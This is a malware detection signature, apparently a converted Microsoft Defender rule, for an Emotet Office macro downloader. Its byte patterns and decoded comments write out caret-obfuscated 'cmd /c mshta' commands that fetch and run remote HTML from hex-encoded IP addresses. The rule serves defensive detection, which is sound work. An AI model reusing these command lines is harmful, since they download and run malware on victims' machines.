
rule TrojanDownloader_O97M_Emotet_EXNP_MTB{
	meta:
		description = "TrojanDownloader:O97M/Emotet.EXNP!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 07 00 00 "
		
	strings :
		$a_01_0 = {63 6d 64 20 2f 63 20 6d 5e 73 68 5e 74 5e 61 20 68 5e 74 74 5e 70 5e 3a 2f 5e 2f 30 78 62 39 30 37 64 36 30 37 2f 66 65 72 2f 66 65 72 2e 68 74 6d 6c } //1 cmd /c m^sh^t^a h^tt^p^:/^/0xb907d607/fer/fer.html
		$a_01_1 = {6d 5e 73 68 5e 74 5e 61 20 68 5e 74 74 5e 70 5e 3a 2f 5e 2f 30 78 35 63 66 66 33 39 63 33 2f 73 65 63 2f 73 65 31 2e 68 74 6d 6c } //1 m^sh^t^a h^tt^p^:/^/0x5cff39c3/sec/se1.html
		$a_03_2 = {3a 2f 5e 2f 30 5e 78 35 5e 62 66 5e 30 37 5e 36 61 5e 38 2f 73 65 2f 73 [0-04] 2e 68 74 6d 6c } //1
		$a_01_3 = {6d 5e 73 68 5e 74 5e 61 20 68 5e 74 74 5e 70 5e 3a 2f 5e 2f 30 78 62 39 30 37 64 36 30 37 2f 66 65 72 2f 66 65 31 2e 68 74 6d 6c } //1 m^sh^t^a h^tt^p^:/^/0xb907d607/fer/fe1.html
		$a_01_4 = {6d 73 5e 68 5e 74 61 20 68 74 5e 74 70 3a 2f 5e 2f 30 78 5e 62 5e 39 30 37 64 36 30 5e 37 2f 66 65 5e 72 2f 66 5e 65 34 2e 68 5e 74 6d 5e 6c } //1 ms^h^ta ht^tp:/^/0x^b^907d60^7/fe^r/f^e4.h^tm^l
		$a_01_5 = {3a 2f 5e 2f 30 78 5e 62 5e 39 30 37 64 36 30 5e 37 2f 66 65 5e 72 2f 66 5e 65 35 2e 68 5e 74 6d 5e 6c } //1 :/^/0x^b^907d60^7/fe^r/f^e5.h^tm^l
		$a_03_6 = {3a 2f 5e 2f 30 78 5e 35 63 66 5e 66 5e 33 39 63 5e 33 5e 2f 5e 73 65 63 5e 2f 5e 73 65 [0-03] 2e 68 74 6d 6c } //1
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_03_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1+(#a_03_6  & 1)*1) >=1
 
}